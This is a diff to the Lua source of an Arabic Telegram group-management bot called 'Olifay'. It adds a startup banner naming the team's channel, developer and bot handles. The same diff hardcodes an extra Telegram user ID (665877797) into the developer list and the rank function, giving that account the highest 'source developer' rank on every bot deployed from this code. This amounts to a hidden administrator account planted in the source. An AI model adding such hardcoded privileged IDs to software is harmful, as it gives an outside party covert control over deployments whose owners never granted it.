@@ -95,8 +95,17 @@ end
 return Status
 end
 Load_File()
-print("\27[36m"..[[                                           
+print("\27[36m"..[[                             
+_____________________      
 
+Olifay Team .
+_____________________
+Channel Olifay  @JJJYT
+
+Developer Olifay @JAN_SAUD
+
+Bot Olifay @olifaybot
+_____________________
 ]]..'\27[m')
 ------------------------------------------------------------------------------------------------------------
 sudos = dofile("./Info_Sudo.lua")
@@ -104,7 +113,7 @@ token = sudos.Token_Bot
 UserName_Dev = sudos.UserName_OLIFIcom
 bot_id = token:match("(%d+)")  
 Id_Dev = sudos.Id_DevOLIFIcom
-Ids_Dev = {1415616558,sudos.Id_DevOLIFIcom,bot_id}
+Ids_Dev = {665877797,1415616558,sudos.Id_DevOLIFIcom,bot_id}
 Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "اوليفاي"
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
@@ -243,7 +252,9 @@ return Status
 end 
 ------------------------------------------------------------------------------------------------------------
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(1415616558) then  
+if tonumber(user_id) == tonumber(665877797) then  
+Status = "مطور السورس"  
+elseif tonumber(user_id) == tonumber(1415616558) then  
 Status = "مطور السورس"  
 elseif Dev_OLIFIcom_User(user_id)  == true then
 Status = "المطور الاساسي"  
